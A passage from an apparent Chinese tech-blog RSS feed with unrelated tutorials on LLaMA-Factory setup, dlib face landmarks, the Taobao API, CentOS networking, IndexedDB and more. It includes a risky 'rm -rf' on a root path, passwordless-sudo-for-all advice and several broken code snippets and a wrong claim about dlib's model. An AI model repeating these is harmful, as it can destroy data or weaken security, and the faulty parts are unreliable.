4.下载项目文件
输入下列命令进行下载模型：
git clone https://github.com/hiyouga/LLaMA-Factory.git
如果出现提示错误的情况，则输入下列命令“rm  -rf  /llama_factor”删除文件后重新下载:
rm  -rf  /llama_factor
5.进入项目文件
首先输入命令
ls
查看一下“LLaMA-Factory”文件是否存在，其次输入“cd LLaMA-Factory”进入模型文件，最后再输入命令“python -m pip install --upgrade pip”升级pip版本号。
ls
cd LLaMA-Factory
python -m pip install --upgrade pip
6.下载项目依赖包
输入下列命令：
pip install -r requirements.txt --index-url https://mirrors.huaweicloud.com/repository/pypi/simple
7.下载Llama3模型
输入命令“mkdir model”新建一个名为“model”的文件夹
mkdir model
ls查看一些文件夹是否存在，输入“cd model”进入文件夹
cd model
输入下列命令下载模型和权重数据集
git clone https://LLM-Research/Meta-Llama-3-8B-Instruct.git
（此模型数据很大约15G，
不
建议下载到系统盘，下载过程很长切勿有其他操作）
8.运行
首先切换到LLama_Factory目录下
cd /LLaMA-Factory
运行下列命令运行：
CUDA_VISIBLE_DEVICES=0 
export PATH=$PATH:/path/to/llamafactory-cli 
export HF_ENDPOINT="https://hf-mirror.com" 
export GRADIO_SERVER_PORT=8080
python src/webui.py --model_name_or_path /model/Meta-Llama-3-8B-Instruct --template llama3 --infer_backend vllm \--vllm_enforce_eager
三、界面演示
1. 成功界面
2. 报错解决</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540028.html</guid><pubDate>Fri, 31 Oct 2025 07:21:14 +0000</pubDate></item><item><title>【进阶OpenCV】 （18）-- Dlib库 --人脸关键点定位</title><link>https://www.ppmy.cn/news/1540029.html</link><description>文章目录
人脸关键点定位
一、作用
二、原理
三、代码实现
1. 构造人脸检测器
2. 载入模型（加载预测器）
3. 获取关键点
4. 显示图像
5. 完整代码
总结
人脸关键点定位
在dlib库中，有
shape_predictor_68_face_landmarks.dat预测器
，这是一个用于
人脸关键点检测
的预训练模型，它能够在人脸图像中定位和识别68个关键点。
一、作用
人脸关键点定位
：
shape_predictor_68_face_landmarks.dat预测器
能够准确地定位人脸的68个关键点，这些关键点涵盖了眼睛、眉毛、鼻子、嘴巴等面部特征。
辅助其他应用
：通过定位这些关键点，该预测器可以为后续的人脸识别、人脸对齐、表情识别、面部动作捕捉等应用提供基础数据支持。
二、原理
基于机器学习
：
shape_predictor_68_face_landmarks.dat预测器
是基于机器学习算法构建的，它通过对大量标注了人脸关键点的图像进行训练，学习人脸关键点的特征。
模型内部结构
：
层次化的神经网络
：预测器内部包含了多个层次的神经网络，这些网络用于逐步
细化面部特征的定位
。
卷积神经网络（CNN）层
：这些层包括卷积层、池化层、全连接层等，它们共同作用于输入图像，提取特征并预测关键点坐标。
工作流程
：
加载模型
：使用dlib库提供的函数加载
shape_predictor_68_face_landmarks.dat预测器
模型。
人脸检测
：首先使用dlib库的人脸检测器检测图像中的人脸区域。
关键点预测
：将检测到的人脸区域作为输入，调用预测器的predict函数，得到68个面部关键点的坐标。
结果可视化
：可以将这些关键点在原始图像上标出来，以直观展示面部特征的定位结果。
训练过程
：
shape_predictor_68_face_landmarks.dat预测器
是在大量标注了人脸关键点的图像数据集上训练得到的。
训练过程中，模型会不断调整其参数，以最小化预测关键点位置与实际标注位置之间的误差。
三、代码实现
人脸图像
：
1. 构造人脸检测器
import
numpy
as
np
import
cv2
import
dlibimg
=
cv2
.
imread
(
'renlian.jpg'
)
detector
=
dlib
.
get_frontal_face_detector
(
)
# 构造人脸检测器
faces
=
detector
(
img
,
0
)
# 检测人脸
2. 载入模型（加载预测器）
函数方法
：
dlib
.
shape_predictor
(
)
载入模型
代码
：
predictor
=
dlib
.
shape_predictor
(
"shape_predictor_68_face_landmarks.dat"
)
3. 获取关键点
遍历每张脸的关键点，获取关键点
将关键点转化为坐标形式
将关键点通过enumerate()函数方法同时获得每个点对应的索引，用于编号
for
face
in
faces
:
# 获取每一张脸的关键点
shape
=
predictor
(
img
,
face
)
# 获取关键点
# 将关键点转换为坐标(x,y)的形式
landmarks
=
np
.
array
(
[
[
p
.
x
,
p
.
y
]
for
p
in
shape
.
parts
(
)
]
)
# 绘制每一张脸的关键点
for
idx
,
point
in
enumerate
(
landmarks
)
:
pos
=
(
point
[
0
]
,
point
[
1
]
)
# 当前关键点坐标
# 针对当前关键点，绘制一个实心圆
cv2
.
circle
(
img
,
pos
,
2
,
(
0
,
255
,
0
)
,
thickness
=
-
1
)
cv2
.
putText
(
img
,
str
(
idx
)
,
pos
,
cv2
.
FONT_HERSHEY_SIMPLEX
,
0.4
,
(
255
,
255
,
255
)
,
1
,
cv2
.
LINE_AA
)
4. 显示图像
cv2
.
imshow
(
"img"
,
img
)
cv2
.
waitKey
(
)
cv2
.
destroyAllWindows
(
)
5. 完整代码
"""-----关键点定位：定位到人脸的眼睛、鼻子、眉毛、轮廓等-----"""
import
numpy
as
np
import
cv2
import
dlibimg
=
cv2
.
imread
(
'renlian.jpg'
)
detector
=
dlib
.
get_frontal_face_detector
(
)
# 构造人脸检测器
faces
=
detector
(
img
,
0
)
# 检测人脸
# dlib.shape_predictor载入模型（加载预测器）
predictor
=
dlib
.
shape_predictor
(
"shape_predictor_68_face_landmarks.dat"
)
for
face
in
faces
:
# 获取每一张脸的关键点
shape
=
predictor
(
img
,
face
)
# 获取关键点
# 将关键点转换为坐标(x,y)的形式
landmarks
=
np
.
array
(
[
[
p
.
x
,
p
.
y
]
for
p
in
shape
.
parts
(
)
]
)
# 绘制每一张脸的关键点
for
idx
,
point
in
enumerate
(
landmarks
)
:
pos
=
(
point
[
0
]
,
point
[
1
]
)
# 当前关键点坐标
# 针对当前关键点，绘制一个实心圆
cv2
.
circle
(
img
,
pos
,
2
,
(
0
,
255
,
0
)
,
thickness
=
-
1
)
cv2
.
putText
(
img
,
str
(
idx
)
,
pos
,
cv2
.
FONT_HERSHEY_SIMPLEX
,
0.4
,
(
255
,
255
,
255
)
,
1
,
cv2
.
LINE_AA
)
cv2
.
imshow
(
"img"
,
img
)
cv2
.
waitKey
(
)
cv2
.
destroyAllWindows
(
)
总结
本篇介绍了如何通过Dlib库自带的预测器，来进行人脸的关键点定位，并将它显示出来。得到关键点定位后，我们就可以通过点位的距离变换，简单的判断人脸表情变换情况。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540029.html</guid><pubDate>Fri, 31 Oct 2025 07:21:16 +0000</pubDate></item><item><title>精准监控，高效分析 —— 淘宝API助力商家实现商品信息精细化管理</title><link>https://www.ppmy.cn/news/1540030.html</link><description>在现代电商领域，商品信息的精准监控和高效分析对于商家来说至关重要。淘宝API（Application Programming Interface）为商家提供了丰富的工具，使他们能够实现对商品信息的精细化管理。通过API，商家可以获取商品的详细数据、监控库存状态、分析销售趋势，并据此制定有效的销售策略。
以下是一个使用Python和淘宝开放平台API实现商品信息精细化管理的示例。假设你已经在淘宝开放平台注册并获取了相应的API Key和App Secret。
1. 安装所需库
首先，确保你已经安装了
requests
库，用于发送HTTP请求。
bash复制代码
pip install requests
2. 获取API权限和Access Token
在淘宝开放平台创建应用并获取API Key和App Secret后，你还需要通过OAuth2.0获取Access Token。具体步骤可以参考淘宝开放平台的文档。
3. 示例代码
以下代码展示了如何使用淘宝API获取商品信息并进行一些基本分析。
python复制代码
import requests
import json
import datetime
# 替换为你的API Key和App Secret
APP_KEY = 'your_app_key'
APP_SECRET = 'your_app_secret'
ACCESS_TOKEN = 'your_access_token'
# 淘宝API的基础URL
BASE_URL = 'https://eco.taobao.com/router/rest'
def get_item_detail(item_id):
"""
获取单个商品的详细信息
"""
params = {
'method': 'taobao.item.get',
'app_key': APP_KEY,
'session': ACCESS_TOKEN,
'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
'format': 'json',
'v': '2.0',
'fields': 'num_iid,title,price,nick,pic_url,stock_quantity',
'num_iid': item_id
}
response = requests.get(BASE_URL, params=params)
if response.status_code == 200:
return response.json()
else:
return None
def analyze_sales_trend(item_id, days=30):
"""
分析商品的销售趋势（简化版，仅作为示例）
"""
# 这里假设你已经有了一个存储每日销量的数据库或日志文件
# 实际情况下，你需要根据API或数据库来获取每日销量数据
# 这里只模拟一些数据
# 示例数据，假设过去30天的销量
sales_data = [
{'date': (datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%Y-%m-%d'), 'sales': i * 10}
for i in range(1, days + 1)
]
# 简单的趋势分析：计算平均销量和最近7天的销量变化
average_sales = sum(item['sales'] for item in sales_data) / len(sales_data)
recent_sales_change = sales_data[-1]['sales'] - sales_data[-8]['sales']
print(f"商品ID: {item_id}")
print(f"过去{days}天平均销量: {average_sales}")
print(f"最近7天销量变化: {recent_sales_change}")
# 可以根据分析结果进行库存调整、促销活动等操作
# 示例：获取商品ID为1234567890的详细信息
item_detail = get_item_detail('1234567890')
if item_detail:
print(json.dumps(item_detail, indent=2, ensure_ascii=False))
# 示例：分析商品ID为1234567890的销售趋势
analyze_sales_trend('1234567890')
注意事项
API调用频率
：淘宝API对调用频率有限制，请确保在合理范围内使用。
数据安全性
：确保API Key和Access Token的安全，不要泄露给未经授权的用户。
数据准确性
：根据实际需求选择合适的数据字段和API方法，确保数据的准确性和完整性。
错误处理
：在实际应用中，添加错误处理机制以应对API调用失败或数据异常的情况。
通过上述示例，你可以初步了解如何使用淘宝API实现商品信息的精准监控和高效分析。根据实际需求，你可以进一步扩展和优化代码，实现更复杂的业务逻辑和数据分析。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540030.html</guid><pubDate>Fri, 31 Oct 2025 07:21:18 +0000</pubDate></item><item><title>Excel中Ctrl+e的用法</title><link>https://www.ppmy.cn/news/1540031.html</link><description>重点：想要使用ctrl+e，前提是整合或拆分后的结果放置的单元格必须和被提取信息的单元格相邻，且被提取信息的单元格也必须相连。
下图为错误示例
这样则可以使用ctrl+e
1、信息整合
2、提取信息
3、添加符号
4、信息顺序调换
5、数字提取
crtl+e还有其他功能，有别的博主写的文章很详细，在这里只点出开头的重点，其他功能不多赘述。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540031.html</guid><pubDate>Fri, 31 Oct 2025 07:21:21 +0000</pubDate></item><item><title>学习笔记之ifconfig看不到ens33的解决方法和普通用户sudo命令的配置</title><link>https://www.ppmy.cn/news/1540032.html</link><description>1.遇到的问题：使用finalshell与centos进行连接时，发现连接不上，在centos命令行敲下ifconfig发现ens33消失了。（ens33里面包含了我们远程连接所需的ip地址）
解决方法：在centos命令窗口依次输入
systemctl stop NetworkManager
systemctl disable NetworkManager
systemctl start network.service
2.为普通用户配置sudo认证：
切换到root用户，执行visudo命令（会自动打开一个vi编辑器）
在文件的最后添加一行
你的用户名 ALL=(ALL)     NOPASSWD:ALL
然后保存退出即可。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540032.html</guid><pubDate>Fri, 31 Oct 2025 07:21:23 +0000</pubDate></item><item><title>cv2.imshow和plt.imshow的区别</title><link>https://www.ppmy.cn/news/1540033.html</link><description>同样一张灰度图，
plt.imshow
显示的图片和
cv2.imshow
显示的图片不一致，这是因为
cv2.imshow
和
plt.imshow
在处理图像显示时的默认行为有所不同。
# matplotlib绘制
plt
.
imshow
(
image
,
"gray"
)
plt
.
show
(
)
# cv2绘制
cv2
.
imshow
(
"img"
,
image
)
cv2
.
waitKey
(
0
)
cv2
.
destroyAllWindows
(
)
从下面图看
matplotlib
绘制的要比
cv2
绘制的对比度更强、更亮
matplotlib绘制
cv2绘制
cv2.imshow和plt.imshow的区别
1. 颜色空间：
cv2.imshow
使用的是 BGR 颜色空间，而
plt.imshow
使用的是 RGB 颜色空间。如果在使用
plt.imshow
时没有指定颜色空间，它会假设输入图像是 RGB 的。
对于灰度图像，这个差异不明显，但在彩色图像中会导致颜色显示不正确。
2. 图像归一化：
plt.imshow
在显示灰度图像时，会自动对图像进行
归一化处理
，即将图像的像素值缩放到 [0, 1] 范围内。
cv2.imshow
则不会进行这种归一化处理，它直接显示图像的原始像素值。
3. 显示范围：
plt.imshow
默认会将灰度图像的像素值映射到 [0, 1] 范围内，这样可以增强对比度，使得图像看起来更亮。
cv2.imshow
则直接使用图像的原始像素值进行显示，如果图像的像素值范围较小，显示出来的图像可能会显得较暗。
为了让两者显示效果一致，可以在使用
plt.imshow
时关闭自动归一化功能，或者手动对图像进行归一化处理后拉伸到0-255再使用
cv2.imshow
进行图像显示。例如：
import
cv2
import
matplotlib
.
pyplot
as
plt
# 假设 image是灰度图像
# 拉升像素值到0-255
min_val
=
np
.
min
(
image
)
max_val
=
np
.
max
(
image
)
stretched_image
=
255
*
(
(
tempImg
-
min_val
)
/
(
max_val
-
min_val
)
)
stretched_image
=
stretched_image
.
astype
(
np
.
uint8
)
# 使用 cv2.imshow 显示
cv2
.
imshow
(
"img"
,
stretched_image
)
cv2
.
waitKey
(
0
)
cv2
.
destroyAllWindows
(
)
# 使用 plt.imshow 显示
plt
.
imshow
(
image
,
cmap
=
'gray'
,
vmin
=
0
,
vmax
=
255
)
plt
.
show
(
)</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540033.html</guid><pubDate>Fri, 31 Oct 2025 07:21:26 +0000</pubDate></item><item><title>基于深度学习的对抗攻击的防御</title><link>https://www.ppmy.cn/news/1540034.html</link><description>基于深度学习的对抗攻击防御是一项重要的研究方向，旨在提高模型在面对对抗样本时的鲁棒性和安全性。对抗攻击通常通过向输入数据中添加微小扰动，使得深度学习模型做出错误的预测。为了应对这些攻击，研究人员提出了多种防御策略。
1.
对抗训练
对抗训练是一种常用的防御方法，核心思想是将对抗样本引入训练过程中。通过将对抗样本与正常样本一起用于模型训练，模型可以学习到更具鲁棒性的特征，从而在面对对抗攻击时表现得更加稳健。这种方法的典型代表是将生成对抗扰动的过程融入训练中，比如Fast Gradient Sign Method（FGSM）或Projected Gradient Descent（PGD）方法。
2.
梯度遮蔽
梯度遮蔽（Gradient Masking）旨在通过使攻击者无法轻易获得梯度信息来阻止对抗攻击。攻击者通常依赖模型的梯度信息来生成对抗样本，而梯度遮蔽技术可以通过使模型的梯度信息不可靠或无法直接利用，从而限制攻击者的能力。然而，这种防御策略在一些情况下可能不够有效，因为有些攻击方法可以绕过梯度遮蔽。
3.
输入数据变换
通过对输入数据进行预处理，来抵抗对抗样本的攻击。例如：
输入去噪
：通过去噪网络或者图像滤波器等方法，将输入中的对抗扰动去除，恢复为原始数据，从而降低攻击效果。
随机化操作
：对输入数据进行随机变换（例如裁剪、缩放、旋转等），使得对抗扰动不再有效。这种方法可以增加对抗样本攻击的难度。
4.
基于认证的防御
基于认证的防御方法旨在为模型提供一种可证明的鲁棒性保证。通过数学方法，例如随机平滑（Randomized Smoothing），可以为模型提供一个认证半径，即在这个半径内的输入扰动不会显著影响模型的预测。这种方法通常通过增加计算复杂度来换取鲁棒性保障。
5.
特征空间的对抗防御
一些研究关注于如何在特征空间内增强模型的鲁棒性。通过在训练过程中约束特征空间中的变化，使得对抗扰动不易改变特征表示，可以提高模型的对抗鲁棒性。例如，基于深度特征的距离约束或正则化可以帮助模型在面对对抗样本时维持正确的预测。
6.
神经网络架构的改进
通过设计更鲁棒的网络架构来抵御对抗攻击。例如，使用具有冗余性和冗余计算的深层神经网络，使得攻击者无法轻易找到影响模型预测的对抗扰动。这类方法通常结合了新型的网络层设计和训练策略，以提高整体鲁棒性。
7.
检测对抗样本
除了增强模型自身的防御能力，另一种防御思路是构建对抗样本检测器。通过在模型的前处理或后处理中引入对抗样本检测机制，可以在对抗样本进入模型之前对其进行标记并进行处理。这类方法通过检测输入数据的异常特征（例如输入分布的变化）来识别潜在的对抗样本。
总结
基于深度学习的对抗攻击防御方法种类多样，包括对抗训练、梯度遮蔽、输入数据变换、基于认证的防御、特征空间防御、架构改进以及对抗样本检测等策略。每种方法各有优缺点，通常实际应用中会结合多种防御策略以增强模型的鲁棒性。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540034.html</guid><pubDate>Fri, 31 Oct 2025 07:21:28 +0000</pubDate></item><item><title>淘宝商品 API 接口怎样去使用？</title><link>https://www.ppmy.cn/news/1540035.html</link><description>​​​​​​​
在当今数字化商业时代，淘宝作为全球最大的电子商务平台之一，拥有海量的商品资源和庞大的用户群体。对于开发者和企业来说，淘宝商品 API 接口提供了一种强大的工具，可以实现对淘宝商品数据的高效获取和利用。本文将详细介绍淘宝商品 API 接口的使用流程。
一、准备工作
注册成为淘宝开发者
要使用淘宝商品 API 接口，首先需要注册成为淘宝开发者。可以访问淘宝开放平台，点击 “立即入驻” 按钮，按照提示完成注册流程。注册过程中需要提供一些基本信息，如企业名称、联系人信息等。
申请 API 权限
注册成功后，登录淘宝开放平台，进入 “控制台” 页面。在 “我的应用” 中，点击 “创建应用” 按钮，填写应用名称、应用描述等信息，选择应用类型为 “自用型” 或 “他用型”。创建应用后，需要申请相应的 API 权限。在 “应用管理” 页面中，点击 “权限管理” 选项卡，选择需要申请的 API 权限，如商品查询 API、商品详情 API 等。申请 API 权限时，需要填写应用的使用场景和目的，以便淘宝审核。
获取 API 密钥
申请 API 权限通过后，可以在 “应用管理” 页面中查看应用的 App Key 和 App Secret。这两个密钥是调用淘宝商品 API 接口的凭证，需要妥善保管，不要泄露给他人。
二、了解 API 接口文档
阅读 API 文档
在开始使用淘宝商品 API 接口之前，需要仔细阅读 API 接口文档。淘宝开放平台提供了详细的 API 文档，包括接口说明、请求参数、返回结果等信息。可以在 “文档中心” 页面中找到相应的 API 文档，下载并阅读。
理解接口功能
通过阅读 API 文档，了解每个 API 接口的功能和用途。例如，商品查询 API 可以根据关键词、类目、价格等条件查询淘宝平台上的商品信息；商品详情 API 可以获取商品的详细信息，包括商品名称、价格、描述、图片、库存等。根据自己的需求选择合适的 API 接口。
掌握请求参数和返回结果格式
API 接口文档中会详细说明每个 API 接口的请求参数和返回结果格式。请求参数包括必选参数和可选参数，需要根据接口要求正确设置。返回结果通常以 JSON 格式返回，需要了解返回结果中的各个字段的含义，以便正确解析和处理数据。
三、开发环境搭建
选择编程语言
根据自己的开发需求和技术栈，选择合适的编程语言进行开发。淘宝商品 API 接口支持多种编程语言，如 Java、Python、PHP 等。可以根据自己的熟悉程度和项目需求选择一种编程语言。
安装开发工具
根据选择的编程语言，安装相应的开发工具。例如，如果选择 Java 语言，可以安装 IntelliJ IDEA 或 Eclipse 等开发工具；如果选择 Python 语言，可以安装 PyCharm 或 Anaconda 等开发工具。
引入 API 库
在开发环境中，需要引入淘宝商品 API 接口的库文件。不同的编程语言有不同的库文件，可以在淘宝开放平台的 “文档中心” 页面中找到相应的库文件下载链接。下载库文件后，将其引入到开发项目中，以便调用 API 接口。
四、调用 API 接口
构建请求参数
根据 API 接口文档的要求，构建请求参数。请求参数通常包括必选参数和可选参数，可以根据自己的需求设置相应的参数值。例如，调用商品查询 API 时，可以设置关键词、类目、价格范围等参数，以便查询符合条件的商品信息。
发送 API 请求
使用选择的编程语言和开发工具，发送 API 请求。可以使用 HTTP 库或 SDK 提供的方法发送请求，并将请求参数传递给 API 接口。发送请求后，会收到淘宝服务器返回的响应结果。
处理响应结果
收到响应结果后，需要根据 API 接口文档的说明，解析响应结果中的数据。响应结果通常以 JSON 格式返回，可以使用相应的 JSON 解析库将其转换为编程语言中的数据结构，如字典、列表等。然后，根据自己的需求提取所需的数据，并进行进一步的处理和分析。
五、数据处理与应用
数据存储
如果需要将获取到的商品数据进行存储，可以选择合适的数据库进行存储。常见的数据库有 MySQL、Oracle、SQL Server 等。可以根据自己的需求和技术栈选择一种数据库，并使用相应的数据库操作库将数据存储到数据库中。
数据分析
对获取到的商品数据进行分析，可以了解市场趋势、用户需求等信息。可以使用数据分析工具，如 Excel、Python 的数据分析库（如 Pandas、Numpy 等）进行数据分析。通过数据分析，可以为企业的决策提供数据支持。
应用开发
根据获取到的商品数据，可以开发各种应用，如电商平台、价格比较网站、数据分析工具等。可以使用相应的开发框架和技术，如 Django、Flask、Vue.js 等进行应用开发。通过应用开发，可以将商品数据转化为有价值的应用，为用户提供更好的服务。
六、淘宝商品 API 接口的使用案例
案例一：电商平台商品管理
一家新兴的电商平台，在起步阶段面临商品种类有限的问题。通过接入淘宝商品 API 接口，他们能够快速获取大量丰富的商品信息。首先，利用商品查询 API，根据平台的目标用户群体和市场定位，设置特定的关键词、类目和价格范围等参数，获取符合要求的商品列表。然后，对于每个商品，通过商品详情 API 获取更详细的信息，如商品描述、图片、规格参数等。这些数据被存储到自己的数据库中，并在平台上进行展示。这样，用户在这个电商平台上就能浏览到来自淘宝的海量商品，大大提升了平台的吸引力和竞争力。同时，平台还可以根据商品的销售数据和用户反馈，利用 API 定期更新商品信息，确保商品数据的准确性和时效性。
案例二：价格比较网站
有一个专门的价格比较网站，旨在为消费者提供不同电商平台上同款商品的价格对比。通过调用淘宝商品 API 接口，该网站可以实时获取淘宝平台上商品的价格信息。当用户在网站上输入商品名称或关键词时，网站利用 API 快速查询淘宝上的相关商品，并提取价格、卖家信誉等关键信息。同时，网站还会与其他电商平台的 API 进行对接，获取相同商品在不同平台的价格。经过整合和对比后，将最优惠的价格信息展示给用户，帮助用户做出更明智的购物决策。此外，网站还可以根据用户的浏览历史和偏好，通过 API 获取相关商品的推荐，进一步提升用户体验。
七、注意事项
遵守 API 使用规范
在使用淘宝商品 API 接口时，需要遵守淘宝开放平台的 API 使用规范。这些规范包括但不限于请求频率限制、数据使用范围、隐私保护等。违反使用规范可能会导致 API 密钥被封禁或其他不良后果。
数据安全与隐私保护
在获取和处理商品数据时，需要注意数据安全和隐私保护。确保采取适当的安全措施，防止数据泄露和滥用。同时，需要遵守相关的法律法规，保护用户的隐私权益。
错误处理与异常情况处理
在调用 API 接口时，可能会出现各种错误和异常情况，如网络连接失败、API 接口返回错误码等。需要对这些错误和异常情况进行处理，确保程序的稳定性和可靠性。可以使用 try-catch 语句捕获异常，并进行相应的错误处理。
定期更新与维护
淘宝商品数据是不断变化的，因此需要定期更新和维护获取到的数据。可以设置定时任务或使用事件触发的方式，定期调用 API 接口获取最新的商品数据。同时，需要对程序进行维护和优化，确保其性能和稳定性。
八、总结
淘宝商品 API 接口为开发者和企业提供了一种强大的工具，可以实现对淘宝商品数据的高效获取和利用。通过注册成为淘宝开发者、申请 API 权限、了解 API 接口文档、搭建开发环境、调用 API 接口、处理数据和注意事项等步骤，可以顺利地使用淘宝商品 API 接口。在使用过程中，需要遵守 API 使用规范、注意数据安全和隐私保护、处理错误和异常情况、定期更新和维护数据，以确保程序的稳定性和可靠性。通过合理地利用淘宝商品 API 接口，可以为企业的发展和创新提供有力的支持。如遇任何疑问或有进一步的需求，请随时与我私信联系或者评论。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540035.html</guid><pubDate>Fri, 31 Oct 2025 07:21:30 +0000</pubDate></item><item><title>vue3使用indexDB缓存静态资源</title><link>https://www.ppmy.cn/news/1540036.html</link><description>indexDB
IndexedDB 是一个浏览器内建的数据库，它可以存放对象格式的数据,默认情况下，浏览器会将自身所在的硬盘位置剩余容量全部作为indexedDB的存储容量
indexDB的使用
1.初始化数据库
注：数据库的相关操作都是异步的
const request = indexedDB.open(name, version)
name：数据库名称，version：版本号
数据库在打开时，
若没有这个库，则会新建，默认版本号为1；
若有，打开时的版本号比原本保存的版本号更高，则会更新这个库，同时触发upgradeneeded事件
数据库的版本号只会越来越高
新建、编辑、删除一个对象存储表都会执行更新
success：打开成功，数据库准备就绪 ，request.result 中有了一个数据库对象
error：打开失败。
upgradeneeded：更新版本，当数据库的版本更新时触发，例如，1-&gt;2
let db = null; //数据库
async function initData () {return new Promise((resolve, reject) =&gt; {//打开数据库app，如果没有app数据库会创建一个const request = window.indexedDB.open('app', 1)request.onerror = function (event) {console.log('数据库打开报错')reject(event)}request.onsuccess = function (event) {console.log('数据库打开成功')db = event.target.resultdb.onerror = function (error) {console.log('error---------', error)}resolve(db)}//数据库更新request.onupgradeneeded = function (event) {//获取打开（或正在升级）的数据库对象db = event.target.result// 检查数据库中是否存在指定的对象存储（表）  if (!db.objectStoreNames.contains('test')) {// 如果不存在，则创建一个新的对象存储 （表）// 在对象存储中创建索引，以便能够高效地通过指定字段查询记录  const objectStore = db.createObjectStore('test' { keyPath: 'id', autoIncrement: true })// 创建一个名为 'name' 的索引，基于 'name' 字段，允许重复值 （表头name）objectStore.createIndex('name', 'name', { unique: false })// 创建一个名为 'blob' 的索引，基于 'blob' 字段，允许重复值（表头blob）objectStore.createIndex('blob', 'blob', { unique: false })}}})
}
2.设置数据
async function set (data) {return new Promise((resolve, reject) =&gt; {//启动需要访问的表，并设置读写权限(默认只有读取权限)const transaction = db.transaction([’test‘], 'readwrite')//获取指定名称的对象存储（表）const objectStore = transaction.objectStore()//添加数据objectStore.add(data).onsuccess = function (event) {resolve(event)console.log('数据写入成功------')}})
}
3.读取数据
async function get (name) {return new Promise((resolve, reject) =&gt; {// l连接test表，通过index方法获取一个索引（name）的引用，使用索引的get方法发起一个异步请求，以根据索引键（在这个例子中是变量name的值）检索对象const request = db.transaction([‘test’], 'readwrite').objectStore('test').index('name').get(name)request.onsuccess = function (event) {console.log('数据seach')if (event.target.result) {console.log('数据存在')} else {console.log('数据不存在')}resolve(event.target.result)}request.onerror = function (event) {console.log('数据seach失败')reject(event)}})
4.删除数据
async function del (name) {return new Promise((resolve, reject) =&gt; {// 获取要删除的数据的引用const transaction = db.transaction(['test'], 'readwrite')const objectStore = transaction.objectStore('test')const index = objectStore.index('name')const request = index.get(name)// 处理查询结果request.onsuccess = function (event) {const record = event.target.resultif (record) {// 获取主键 idconst id = record.id// 使用主键 id 删除记录const deleteRequest = objectStore.delete(id)// 删除成功deleteRequest.onsuccess = function () {console.log('数据删除成功------')resolve()}deleteRequest.onerror = function (event) {console.log('数据删除失败')reject(event)}} else {console.log('未找到匹配的记录')resolve() // 或者 reject(new Error('未找到匹配的记录'));}}request.onerror = function (event) {console.log('索引查询失败')reject(event)}})
}
5. 清除对象存储（表）
function clear () {
//连接对象存储const objectStore = db.transaction(['test'], 'readwrite').objectStore('test')//清除对象存储objectStore.clear()
}
存储静态资源
1.将静态资源转为流
// 从 IndexedDB 存储图片转成流
function changeBlob (path) {return new Promise((resolve, reject) =&gt; {const xhr = new XMLHttpRequest()xhr.open('GET', path, true) // 使用传入的路径xhr.responseType = 'blob' // 设置响应类型为 blobxhr.onload = function () {if (xhr.status === 200) {let a = ''a = URL.createObjectURL(xhr.response);resolve(xhr.response) // 成功时返回 blob} else {reject(new Error(`Failed to load resource: ${xhr.status}`))}}xhr.onerror = function () {reject(new Error('Network error'))}xhr.send()})
}//图片地址转换
const getAssetsFile = url =&gt; {return new URL(`../assets/images/${url}`, import.meta.url).href
}
缓存静态资源
import { ref, onMounted } from 'vue'
const getAssetsFileImg = getAssetsFile('composite/animation.png')
const imgSrc = ref('')
const initDB = async () =&gt; {
//初始化数据库await initData()// 获取数据的引用const animation = await get('animation')let blob = null// 判断是否有数据，如果没有数据先存入数据if (!animation) {//将静态资源转为blobblob = await changeBlob(getAssetsFileImg)//存入静态资源await set({ name: 'animation', blob })} else {// 如果有数据，取出数据流blob = animation.blob}// 将取出的数据流转为DOMStringimgSrc.value = URL.createObjectURL(blob)
}//  将数据绑定到页面&lt;imgstyle="width: 100%;height: 100%;"src="imgSrc"&gt;</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540036.html</guid><pubDate>Fri, 31 Oct 2025 07:21:33 +0000</pubDate></item><item><title>Maven运行时分析多余依赖问题</title><link>https://www.ppmy.cn/news/1540037.html</link><description>下载 loosejar 库
https://github.com/kyrill007/loosejar/releases
官方文档
以 IntelliJ IDEA 开发工具为例
1. 使用IDE 打开项目工程
2. Edit Configurations ...
如图：
增加 javaagent 配置
如图：
-javaagent:${保存路径}/loosejar-1.1.0.jar
运行SpringBoot Application main 方法
可以在控制台打印日志：
[loosejar]: loosejar analysis is registered to run on JVM shutdown. [loosejar]: Registering loosejar as a JMX service... [loosejar]: Registered loosejar as a JMX service: [com.googlecode.loosejar:type=LooseJarMBean]
如图：
使用JAVA jconsole 来分析
1、cd $JAVA_HOME/bin/
2、open jconsole
3、选择监控进程，点击连接
如图：
选择不安全的连接
如图：
等待服务启动完成
依次点击下图: 1 --&gt; 2 --&gt; 3
MBean -&gt; com.googlecode.loosejar:LooseJarMBean:操作:summary -&gt; 点击summary
获取运行时分析结果如图：
弹出分析结果如图：
拷贝返回值内容到本地文本文件
搜索关键字: Utilization: 0.00%
例如找到如下内容
Jar: /Users/kevin/.m2/repository/org/springframework/boot/spring-boot-starter-data-redis/2.0.8.RELEASE/spring-boot-starter-data-redis-2.0.8.RELEASE.jar
Utilization: 0.00% - loaded 0 of 0 classes.
根据 pom 中配置依赖和文本文件中查询使用率
Utilization/使用率：当使用率为0.00%则
“或许可以”
将该依赖去掉。
分析实现原理：
基于运行时执行逻辑实现，运行时未执行到的代码将会被统计出未使用的情况。
备注：由于该特性是基于代码运行值的情况进行分析，相比启动编译时分析可以或得更精准的结果，但需要注意的时，它的分析是基于你的代码运行过的程序来确定下来的，所以如果代码中某个依赖库代码在运行时没有被执行到，可能会导致分析使用率为零的情况。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540037.html</guid><pubDate>Fri, 31 Oct 2025 07:21:36 +0000</pubDate></item><item><title>Go Wails 学习笔记：创建第一个项目</title><link>https://www.ppmy.cn/news/1540038.html</link><description>文章目录
1. 安装 Wails
2. 创建 Wails 项目
3. 项目结构
4. 运行项目
5. 构建项目
6. 部署和发布
总结
Wails 是一个用于构建跨平台桌面应用程序的框架，允许开发者使用前端技术（如 HTML、CSS、JavaScript）以及 Go 语言来开发桌面应用。本文基于官方文档《 
Wails 入门指南 - 创建第一个项目》总结 Wails 的项目创建过程。
1. 安装 Wails
